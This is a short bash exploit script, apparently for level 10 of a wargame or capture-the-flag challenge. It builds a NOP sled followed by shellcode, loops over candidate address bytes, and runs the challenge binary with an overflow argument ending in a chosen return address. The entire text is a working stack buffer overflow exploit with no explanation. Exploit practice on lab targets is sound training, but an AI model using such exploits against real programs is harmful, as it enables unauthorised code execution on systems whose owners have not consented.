#python -c 'print "\x90"*488' > payload_10
#cat shellcode >> payload_10
max=255
for((i=1;i<=max;i++))
do
  i=$(printf "%X\n" $i)
  echo $i
  #/var/challenge/level10/10 `cat payload_10` `python -c 'print "BAADBAAD"+"\x01\x%i\xff\xff"'`
done
/var/challenge/level10/10 `cat payload_10` `python -c 'print "BAADBAAD"+"\x01\xd5\xff\xff"'`
